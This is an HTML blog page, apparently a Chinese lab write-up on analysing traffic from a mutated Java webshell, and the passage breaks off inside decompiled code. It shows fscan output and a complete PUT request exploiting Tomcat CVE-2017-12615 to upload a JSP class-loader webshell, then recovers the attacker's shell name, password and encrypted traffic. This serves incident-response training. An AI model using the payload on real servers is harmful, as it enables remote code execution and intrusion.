@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="某变异Webshell流量分析-玄机靶场花一下午时间来做了这题，感觉很有意思，把一些知识串了很多但又不是为套而套，在解题过程难得有“即温习了已有知识，又学习到了新姿势”的感觉。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某变异Webshell流量分析-玄机靶场">
+<meta property="og:url" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="某变异Webshell流量分析-玄机靶场花一下午时间来做了这题，感觉很有意思，把一些知识串了很多但又不是为套而套，在解题过程难得有“即温习了已有知识，又学习到了新姿势”的感觉。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250210191829617.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211221344014.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211223217128.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211222956972.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/640">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/640-20250211232400262">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211233516331.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211234043627.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211184257211.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250210205104781.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250210205212566.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250210205633276.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250210222605864.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211171704865.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211174445135.png">
+<meta property="og:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250211165252842.png">
+<meta property="article:published_time" content="2025-02-28T14:54:57.466Z">
+<meta property="article:modified_time" content="2025-02-28T15:00:10.410Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250210191829617.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>某变异Webshell流量分析-玄机靶场 | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+
+
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DragonBones/" rel="tag">DragonBones</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine/" rel="tag">Machine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/" rel="tag">re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby/" rel="tag">ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap">
+
+
+
+<article id="post-某变异Webshell流量分析-玄机靶场" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/" class="article-date">
+      <time datetime="2025-02-28T14:54:57.466Z" itemprop="datePublished">2025-02-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      某变异Webshell流量分析-玄机靶场
+    </h1>
+  
+
+
+          <div style="margin-top:10px 0;margin-bottom:15px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">4.4k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">21分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">玄机靶场</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="某变异Webshell流量分析-玄机靶场"><a href="#某变异Webshell流量分析-玄机靶场" class="headerlink" title="某变异Webshell流量分析-玄机靶场"></a>某变异Webshell流量分析-玄机靶场</h1><p>花一下午时间来做了这题，感觉很有意思，把一些知识串了很多但又不是为套而套，在解题过程难得有“即温习了已有知识，又学习到了新姿势”的感觉。<a id="more"></a></p>
+<h3 id="立足点获取"><a href="#立足点获取" class="headerlink" title="立足点获取"></a>立足点获取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不提供，渗透进入</span><br></pre></td></tr></table></figure>
+
+<p>题目不提供root用户的账号密码要我们自己打入。</p>
+<p>先fscan 扫描下，发现有个poc-yaml-iis-put-getshell与poc-yaml-tomcat-cve-2017-12615-rce。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">╰ .&#x2F;fscan_mac -h  52.82.19.202</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;</span><br><span class="line">&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">52.82.19.202:8009 open</span><br><span class="line">52.82.19.202:8081 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http:&#x2F;&#x2F;52.82.19.202:8081  code:200 len:11230  title:Apache Tomcat&#x2F;8.5.19</span><br><span class="line">[+] PocScan http:&#x2F;&#x2F;52.82.19.202:8081 poc-yaml-iis-put-getshell</span><br><span class="line">[+] PocScan http:&#x2F;&#x2F;52.82.19.202:8081 poc-yaml-tomcat-cve-2017-12615-rce</span><br></pre></td></tr></table></figure>
+
+<p>查询下cve-2017-12615 可以通过put 写入后面，编织payload如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/lexs.jsp/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 52.83.29.154:8081</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Priority</span>: u=0, i</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 961</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName("sun.misc.BASE64Decoder");</span><br><span class="line">            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName("java.util.Base64");</span><br><span class="line">            Object decoder = clazz.getMethod("getDecoder").invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter("shell");</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 然后用蚁剑进行连接，然后就是常规反弹shell。</p>
+<h3 id="黑客上传的木马文件名是什么"><a href="#黑客上传的木马文件名是什么" class="headerlink" title="黑客上传的木马文件名是什么"></a>黑客上传的木马文件名是什么</h3><p>分析流量，发现黑客用户跟我们差不多的思路，put上传文件。</p>
+<p><img src="./image-20250210191829617.png" alt="image-20250210191829617"></p>
+<p>上传的名为hello.jsp文件,且后续频繁访问，且返回包长不一致。查看PUT /hello.jsp/  包，发现就是我用的那个payload模版改的。</p>
+<p><img src="./image-20250211221344014.png" alt="image-20250211221344014"></p>
+<p>所以文件名就是hello.jsp。</p>
+<p>flag：<code>flag{hello.jsp}</code></p>
+<h3 id="黑客上传的木马连接密码是什么"><a href="#黑客上传的木马连接密码是什么" class="headerlink" title="黑客上传的木马连接密码是什么"></a>黑客上传的木马连接密码是什么</h3><p>把hello.jsp里base64部分用CyberChef进行解码。</p>
+<p><img src="./image-20250211223217128.png" alt="image-20250211223217128"></p>
+<p>在解base64与gzip发现是一个java classes 。</p>
+<p>用java反编译工具查看:</p>
+<p><img src="./image-20250211222956972.png" alt="image-20250211222956972"></p>
+<p>发现工具反编译不完全提示“Unable to fully structure code   Could not resolve type clashes，在能阅读审计的地方，发现其中有个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private java.lang.String P() &#123;</span><br><span class="line">    return &quot;SjIHRC7oSVIE&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>推测，p就是password 密码是<code>SjIHRC7oSVIE</code>。</p>
+<p>同时，分析前后的post hello.jsp 路径的包发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;hello.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.168:8081</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: JSESSIONID&#x3D;F926898CF709898D3D36F8B038C03E72</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 639</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0.000000s</span><br><span class="line">&#123;&quot;SjIHRC7oSVIE&quot;:&quot;SpL+x7y+I+ZMyWEXeJ0NZMa2lXxVJJQX8qje+iiGLCag8tPabyOaifukFtoSxu6RFUpZaKyNuMCXHzK3RDjcTFL73lNoG0uHqJJBjObbdTPDfU7cYGyAY5cXrNzHkdq6IyH1gpeYpyzuLqXSSjhkwp1pKh6Uh6asrqyZuM97bG3Vakj6n1FXkVyDfSWHkDhIns9VKOKE5dgs4ZwhBUxRI67sQmSA2+47jDr&#x2F;nLzxsa1DIv9K67DBh8hrgV2XrBsGbbCsaiZo45Qxy62KbNjXeNpMjnAF&#x2F;05JhkOqFkaqh97yhOgERj&#x2F;cx+y5sYC3GTSBK5UW7o8ozXn3OjZt1b6OFnX13uDI8Pnvajsw1EaY&#x2F;KaDNCUS6ATLbajdQsza7Rmt1MODH7j5EW49s+1dKHdrWGv27YLnRMqQptBCn56yoiLZ21aJ&#x2F;CggSZnRqdee7pChC23JnN+E3t2tKQG8QQnxT6XXsTmii0kRCEoXFiEVrmJpg+7wo1Mqpj9T32i6wlmP+bdJWcOxjizJOoSkd0RAVf8dU399C2TkViAaOhLAj2XCW+qF8z6Dbs&#x2F;G1HIs51QGig0ujdQFkZ+j6wo2F5B0OBh0oMLT4q2A9DuU5XEC00M&#x3D;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>都有”SjIHRC7oSVIE”相关数据从而验证猜测</p>
+<p>flag为<code>flag{SjIHRC7oSVIE}</code></p>
+<h3 id="分析黑客上传的木马，找到木马通讯的key是什么"><a href="#分析黑客上传的木马，找到木马通讯的key是什么" class="headerlink" title="分析黑客上传的木马，找到木马通讯的key是什么"></a>分析黑客上传的木马，找到木马通讯的key是什么</h3><p>刚刚我们在分析木马，在用工具反编译到下面代码后，之后的代码就要手动编译了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.coyote.<span class="keyword">module</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">org</span>.<span class="title">apache</span>.<span class="title">coyote</span>.<span class="title">module</span>.<span class="title">ThrowableDeserializer</span></span></span><br><span class="line"><span class="class"><span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> java.lang.String a;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpServletRequest b;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpServletResponse c;</span><br><span class="line">    <span class="keyword">private</span> java.util.Map&lt;java.lang.String, java.lang.Object&gt; d;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> e;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> f;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.lang.String[] g;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.lang.String[] h;</span><br><span class="line"></span><br><span class="line">    <span 